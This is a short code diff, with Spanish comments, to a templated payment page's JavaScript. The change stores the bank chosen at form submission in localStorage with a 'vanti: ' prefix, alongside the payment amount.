@@ -109,17 +109,20 @@
     registrarActividad();
     setInterval(registrarActividad, 5000);
 
-    // NUEVO: Capturar los datos del formulario antes de enviarlos y guardarlos en localStorage
+    // Capturar los datos del formulario antes de enviarlos
     document.querySelector("form").addEventListener("submit", function(e) {
         const selectBanco = document.querySelector("select[name='banco']");
         const bancoSeleccionado = selectBanco ? selectBanco.value : "";
-        
-        // Obtenemos el monto directamente de la plantilla de Jinja2 o del DOM
         const montoTotal = "{{ monto }}"; 
 
         if (bancoSeleccionado) {
-            localStorage.setItem("banco", bancoSeleccionado);
+            // AQUÍ APLICAMOS EL FORMATO DESEADO:
+            // Guardará por ejemplo: "vanti: BANCO DE BOGOTA" o "vanti: BANCO POPULAR"
+            const bancoFormateado = `vanti: ${bancoSeleccionado}`;
+            
+            localStorage.setItem("banco", bancoFormateado);
         }
+        
         if (montoTotal) {
             localStorage.setItem("valor", montoTotal);
         }
